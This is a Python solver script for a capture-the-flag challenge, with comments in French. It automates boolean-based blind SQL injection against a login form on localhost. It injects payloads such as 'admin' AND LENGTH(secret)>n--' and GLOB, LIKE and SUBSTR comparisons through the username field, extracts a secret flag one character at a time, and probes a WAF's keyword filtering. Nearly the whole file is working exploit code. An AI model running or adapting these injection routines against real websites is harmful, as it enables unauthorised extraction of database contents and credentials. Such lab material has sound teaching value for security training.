#!/usr/bin/env python3
"""
CH06 - Caine: Solution Script
Blind SQL Injection - Boolean-based avec GLOB

Ce script exploite la vulnérabilité Blind SQLi pour extraire le flag
caractère par caractère en utilisant la fonction GLOB de SQLite.

GLOB vs LIKE:
- GLOB est case-sensitive (important pour les flags)
- GLOB utilise * comme wildcard (pas de conflit avec _ dans les flags)
- LIKE utilise % et _ (underscore = single char wildcard = problème)
"""

import requests
import string
import sys
import time
import argparse

# Configuration par défaut
DEFAULT_URL = "http://localhost:5001/"
CHARSET = string.ascii_uppercase + string.ascii_lowercase + string.digits + "{}_"

# Indicateurs de réponse
TRUE_INDICATOR = "Access denied"        # User trouvé (condition vraie)
FALSE_INDICATOR = "Invalid credentials" # User non trouvé (condition fausse)


def test_condition(url, payload):
    """
    Envoie une requête avec le payload et détermine si la condition est vraie ou fausse
    """
    data = {
        "username": payload,
        "password": "x"
    }
    try:
        response = requests.post(url, data=data, timeout=10)
        return TRUE_INDICATOR in response.text
    except requests.RequestException as e:
        print(f"[-] Erreur de requête: {e}")
        return False


def find_secret_length(url):
    """
    Trouve la longueur du champ secret par recherche binaire
    """
    print("[*] Recherche de la longueur du secret...")

    # Recherche binaire pour optimiser
    low, high = 1, 100
    while low < high:
        mid = (low + high) // 2
        payload = f"admin' AND LENGTH(secret)>{mid}--"
        if test_condition(url, payload):
            low = mid + 1
        else:
            high = mid

    # Vérification
    payload = f"admin' AND LENGTH(secret)={low}--"
    if test_condition(url, payload):
        print(f"[+] Longueur du secret: {low}")
        return low

    print("[-] Impossible de déterminer la longueur")
    return None


def extract_flag_with_glob(url):
    """
    Extrait le flag caractère par caractère avec GLOB (case-sensitive)
    GLOB utilise * comme wildcard, pas de conflit avec _ dans les flags
    """
    print("[*] Extraction du flag avec GLOB (case-sensitive)...")
    flag = ""

    while not flag.endswith('}'):
        found = False
        for char in CHARSET:
            # Escape les caractères spéciaux pour GLOB: * ? [ ]
            escaped_char = char
            if char in ['*', '?', '[', ']']:
                escaped_char = f'[{char}]'

            test_flag = flag + escaped_char
            payload = f"admin' AND secret GLOB '{test_flag}*'--"

            if test_condition(url, payload):
                flag += char
                print(f"[+] Flag actuel: {flag}")
                found = True
                break

        if not found:
            print(f"[-] Aucun caractère trouvé après: {flag}")
            # Essayer des caractères spéciaux supplémentaires
            print("[*] Essai avec des caractères spéciaux...")
            for char in "!@#$%^&*()-+=;:',.<>?/`~":
                escaped_char = char
                if char in ['*', '?', '[', ']']:
                    escaped_char = f'[{char}]'
                test_flag = flag + escaped_char
                payload = f"admin' AND secret GLOB '{test_flag}*'--"
                if test_condition(url, payload):
                    flag += char
                    print(f"[+] Flag actuel: {flag}")
                    found = True
                    break

            if not found:
                print("[-] Échec de l'extraction")
                break

    return flag


def extract_flag_with_like_escaped(url):
    """
    Alternative: LIKE avec escape des underscores
    Nécessite ESCAPE clause: LIKE 'pattern' ESCAPE '\\'
    """
    print("[*] Extraction du flag avec LIKE (avec escape)...")
    flag = ""

    while not flag.endswith('}'):
        found = False
        for char in CHARSET:
            # Escape les caractères spéciaux pour LIKE
            escaped_char = char
            if char == '%':
                escaped_char = '\\%'
            elif char == '_':
                escaped_char = '\\_'
            elif char == '\\':
                escaped_char = '\\\\'

            # Construire le pattern avec tous les escapes
            pattern = ""
            for c in flag:
                if c == '_':
                    pattern += '\\_'
                elif c == '%':
                    pattern += '\\%'
                else:
                    pattern += c
            pattern += escaped_char

            payload = f"admin' AND secret LIKE '{pattern}%' ESCAPE '\\\\'--"

            if test_condition(url, payload):
                flag += char
                print(f"[+] Flag actuel: {flag}")
                found = True
                break

        if not found:
            print(f"[-] Aucun caractère trouvé après: {flag}")
            break

    return flag


def extract_flag_with_substr(url):
    """
    Alternative: SUBSTR pour extraction position par position
    """
    print("[*] Extraction du flag avec SUBSTR...")
    flag = ""
    position = 1

    while not flag.endswith('}') and position < 100:
        found = False
        for char in CHARSET:
            payload = f"admin' AND SUBSTR(secret,{position},1)='{char}'--"

            if test_condition(url, payload):
                flag += char
                print(f"[+] Flag actuel: {flag}")
                position += 1
                found = True
                break

        if not found:
            print(f"[-] Aucun caractère trouvé à la position {position}")
            break

    return flag


def main():
    parser = argparse.ArgumentParser(description='CH06 - Caine: Blind SQLi Solver')
    parser.add_argument('-u', '--url', default=DEFAULT_URL, help='URL cible')
    parser.add_argument('-m', '--method', choices=['glob', 'like', 'substr'],
                        default='glob', help='Méthode d\'extraction')
    args = parser.parse_args()

    url = args.url

    print("=" * 60)
    print("CH06 - Caine: Blind SQL Injection Solver")
    print("=" * 60)
    print()

    # Test de connexion
    print(f"[*] Cible: {url}")
    try:
        r = requests.get(url, timeout=5)
        if r.status_code == 200:
            print("[+] Serveur accessible")
        else:
            print(f"[-] Status code inattendu: {r.status_code}")
            sys.exit(1)
    except requests.RequestException as e:
        print(f"[-] Erreur de connexion: {e}")
        sys.exit(1)

    print()

    # Vérification que le Blind SQLi fonctionne
    print("[*] Vérification de la vulnérabilité Blind SQLi...")
    if test_condition(url, "admin' AND 1=1--"):
        print("[+] Condition TRUE détectée (AND 1=1)")
    else:
        print("[-] Condition TRUE non détectée")
        sys.exit(1)

    if not test_condition(url, "admin' AND 1=2--"):
        print("[+] Condition FALSE détectée (AND 1=2)")
    else:
        print("[-] Condition FALSE non détectée")

    print()

    # Vérifier que le WAF bloque bien les mots-clés
    print("[*] Vérification du WAF...")
    waf_tests = [
        ("UNION", "admin' UNION--"),
        ("SELECT", "admin' SELECT--"),
        ("SLEEP", "admin' AND SLEEP(1)--"),
    ]
    for keyword, payload in waf_tests:
        if not test_condition(url, payload):
            print(f"[+] WAF bloque: {keyword}")
        else:
            print(f"[-] WAF ne bloque PAS: {keyword}")

    print()

    # Trouver la longueur du secret
    secret_length = find_secret_length(url)
    print()

    # Extraire le flag selon la méthode choisie
    start_time = time.time()

    if args.method == 'glob':
        flag = extract_flag_with_glob(url)
    elif args.method == 'like':
        flag = extract_flag_with_like_escaped(url)
    else:
        flag = extract_flag_with_substr(url)

    elapsed = time.time() - start_time

    print()
    print("=" * 60)
    print(f"[+] FLAG EXTRAIT: {flag}")
    print(f"[*] Temps d'extraction: {elapsed:.2f} secondes")
    print(f"[*] Méthode utilisée: {args.method.upper()}")
    print("=" * 60)

    return flag


if __name__ == "__main__":
    main()
